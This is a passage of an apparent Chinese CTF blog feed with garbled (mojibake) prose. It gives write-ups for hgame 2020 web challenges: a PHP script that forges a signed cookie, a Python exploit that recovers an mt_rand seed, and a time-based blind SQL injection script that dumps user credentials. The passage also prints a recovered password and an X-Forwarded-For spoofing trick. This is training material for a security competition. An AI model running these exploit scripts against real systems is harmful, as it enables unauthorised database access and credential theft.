&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png&#34; alt=&#34;2&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å°† playername èµ‹å€¼ä¸º % s å°±å¯ä»¥å¾ªç¯çš„å°†ç¬¬äºŒä¸ªå€¼è¾“å‡ºï¼Œæ‹¿åˆ° encryptKeyã€‚&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Rank&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$rank&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$serverKey&lt;/span&gt;;     &lt;span class=&#34;hljs-comment&#34;&gt;// æœåŠ¡å™¨çš„ Key&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;key = &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;serverKey;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Rank();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playername&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$encryptKey&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; .= md5(&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = md5(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt; = base64_encode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;) . &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$sign&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ”¹ä¸€ä¸‹ cookie å°±æ‹¿åˆ°äº† flag&lt;/p&gt;
&lt;h2 id=&#34;äºŒå‘å…¥é­‚&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#äºŒå‘å…¥é­‚&#34;&gt;#&lt;/a&gt; äºŒå‘å…¥é­‚&lt;/h2&gt;
&lt;p&gt;æ‰“å¼€é¢˜ç›®ä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“åœ¨å¹²ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“è¦å¹²ä»€ä¹ˆï¼Œçœ‹äº† WP æ‰çŸ¥é“å¥½åƒæ˜¯è¦é€šè¿‡ç”Ÿæˆçš„éšæœºæ•°æ¥è¿˜åŸ seedï¼Œéš¾æ€ªå›¾ç‰‡è¯´èµ¶å¿«äº¤å‡ºç§å­ã€‚ã€‚æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ‹¿åˆ° seedï¼Œä¸€ç§æ˜¯é€šè¿‡å¾—çŸ¥&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä» mt_rand () è·å– 2 ä¸ªå€¼ï¼šR000 ä»¥åŠ R227ï¼Œä¸­é—´é—´éš” 226 ä¸ªå€¼ï¼›æ­¤å¤–è¿˜éœ€çŸ¥é“ R000 ä¹‹å‰å·²ç”Ÿæˆçš„å€¼çš„ä¸ªæ•°ï¼ˆç”¨ i è¡¨ç¤ºï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®è¿™äº›å€¼ç®—å‡ºåŠ æ‰°çŠ¶æ€å€¼ï¼›&lt;/li&gt;
&lt;li&gt;å¼‚æˆ–è¿™äº›çŠ¶æ€å€¼ï¼Œæ¨æµ‹å‡ºåŸå§‹çš„çŠ¶æ€å€¼ï¼ˆs228ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ® s228ï¼Œæ¨æµ‹å‡º s0ï¼Œè·å–ç§å­ã€‚&lt;br&gt;
&lt;a href=&#34;https://www.anquanke.com/post/id/196831&#34;&gt;https://www.anquanke.com/post/id/196831&lt;/a&gt;&lt;br&gt;
 è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡ php çš„ php_mt_seed å‡½æ•°ç›´æ¥çˆ†ç ´ seed&lt;br&gt;
&lt;a href=&#34;https://www.freebuf.com/vuls/192012.html&#34;&gt;https://www.freebuf.com/vuls/192012.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ”¾ä¸€ä¸ªç½‘ä¸Šçš„ expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;import requests&lt;br&gt;import os&lt;br&gt;s = requests&lt;span class=&#34;hljs-selector-class&#34;&gt;.session&lt;/span&gt;()&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/random.php?times=228&amp;quot;&lt;/span&gt;&lt;br&gt;cookie = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;PHPSESSID&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;lf08on0tsqpggqqvulpsg278h1&amp;#x27;&lt;/span&gt;&amp;#125;&lt;br&gt;c = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.get&lt;/span&gt;(url,cookies = cookie)&lt;br&gt;ans = str(c.text)&lt;br&gt;ans = eval(ans)&lt;br&gt;R0 = ans&lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;&lt;br&gt;R227 = ans&lt;span class=&#34;hljs-selector-attr&#34;&gt;[227]&lt;/span&gt;&lt;br&gt;req = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;python reverse_mt_rand.py &amp;#x27;&lt;/span&gt;+str(R0)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;+str(R227)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; 0 0&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; = os&lt;span class=&#34;hljs-selector-class&#34;&gt;.popen&lt;/span&gt;(req)&lt;br&gt;x = &lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.read&lt;/span&gt;()&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.close&lt;/span&gt;()&lt;br&gt;x = str(x&lt;span class=&#34;hljs-selector-class&#34;&gt;.replace&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;))&lt;br&gt;url2 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/verify.php&amp;quot;&lt;/span&gt;&lt;br&gt;data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ans&amp;quot;&lt;/span&gt;:x&amp;#125;&lt;br&gt;final = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.post&lt;/span&gt;(url = url2,cookies = cookie,data = data)&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(final.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;cosmosçš„äºŒæ‰‹å¸‚åœº&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„äºŒæ‰‹å¸‚åœº&#34;&gt;#&lt;/a&gt; Cosmos çš„äºŒæ‰‹å¸‚åœº&lt;/h2&gt;
&lt;p&gt;æ¡ä»¶ç«äº‰çš„é¢˜ç›®ï¼Œç”¨ burp å‘åŒ…ï¼Œä¹°å…¥æ¯”å–å‡ºå°‘ä¸€äº›ï¼Œåˆ·ä½™é¢&lt;/p&gt;
&lt;h2 id=&#34;cosmosçš„ç•™è¨€æ¿-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„ç•™è¨€æ¿-2&#34;&gt;#&lt;/a&gt; Cosmos çš„ç•™è¨€æ¿ - 2&lt;/h2&gt;
&lt;p&gt;å‘ç°åˆ é™¤ç•™è¨€éƒ¨åˆ†å­˜åœ¨ sql æ³¨å…¥ï¼Œç”±äºæ²¡æœ‰å›æ˜¾ï¼Œåªèƒ½ç›²æ³¨&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png&#34; alt=&#34;3&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://139.199.182.61:19999/index.php?method=&lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt;&amp;amp;delete_id=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;test = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;schema_name&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.schemata&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(table_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.tables&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(column_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.columns&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,name,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;babysql.&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;cookie = &amp;#123;&amp;#x27;PHPSESSID&amp;#x27;:&amp;#x27;9g4b91gspvooe2up4k2blubbqo&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,20):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(33,127):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;,sleep(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		print(chr(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t1 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload,cookies = cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t2 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(t2-t1&amp;gt;=5):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ‹¿åˆ°è´¦å·å¯†ç ï¼Œä½†æ˜¯ç™»é™†æç¤ºé”™è¯¯ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œå¤šè·‘å‡ æ¬¡æ‰æ‹¿åˆ°äº†æ­£ç¡®çš„è´¦å·å¯†ç ï¼šcosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR&lt;/p&gt;
</content>
        <updated>2020-02-05T15:09:06.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/27/JarvisOj/</id>
        <title>JarvisOj</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/27/JarvisOj/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com/&#34;&gt;https://www.jarvisoj.com/&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&#34;localhost&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#localhost&#34;&gt;#&lt;/a&gt; LocalHost&lt;/h2&gt;
&lt;p&gt;æŠ“åŒ…åŠ ä¸€ä¸ª â€œX-Forwarded-For: 127.0.0.1&amp;quot; å®Œäº‹&lt;/p&gt;
&lt;h2 id=&#34;port51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#port51&#34;&gt;#&lt;/a&gt; PORT51&lt;/h2&gt;
